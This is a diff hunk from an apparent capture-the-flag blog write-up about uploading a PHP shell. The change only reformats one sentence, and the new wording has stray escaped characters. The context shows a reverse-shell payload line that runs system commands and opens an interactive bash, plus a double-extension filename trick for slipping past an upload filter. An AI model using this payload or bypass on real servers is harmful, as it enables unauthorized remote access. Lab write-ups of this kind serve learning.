@@ -53,7 +53,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.29 seconds
 54 $shell = 'uname -a; w; id; /bin/bash -i';
 ```
 
-- My first method of bypassing the php filter did not work (it was *filename.png.php*) and I was greeted with this.
+- My first method of bypassing the php filter did not work (it was \`}filename{\`.png.php) and I was greeted with this.
 
 ![Image showing the upload panel angry at me](/blog/rootmepics/phpuploaddenied.png 'Fig.3')
 
